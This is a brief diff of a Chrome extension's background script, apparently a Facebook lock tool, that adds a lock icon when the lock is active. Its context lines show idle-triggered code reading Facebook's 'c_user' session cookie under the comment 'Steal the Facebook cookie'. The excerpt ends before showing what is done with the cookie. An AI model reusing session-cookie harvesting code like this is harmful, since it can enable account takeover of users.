@@ -1,7 +1,5 @@
 // Background.js
 
-//localStorage["Facebook-Lock"]="";
-
 // Add listeners
 chrome.tabs.onUpdated.addListener(function(tabId, something, tab) {
 
@@ -107,11 +105,14 @@ function checkState() {
 	
 	if(str["activated"] === "true") {
 		
+		// When checked, set the lock picture
+		chrome.browserAction.setIcon({path:"static/lock.png"});
+		
 		// Minimum 15
 		chrome.idle.queryState(Number(str["idle-time"])*60, function(state) { // Because it's in seconds
 			if(state=="idle") {
 			
-				//alert("locked"); // Testing purposes
+				// alert("locked"); // Testing purposes
 				
 				// Steal the Facebook cookie
 				chrome.cookies.getAll({domain:".facebook.com",name:"c_user"},function(a_cookies) {
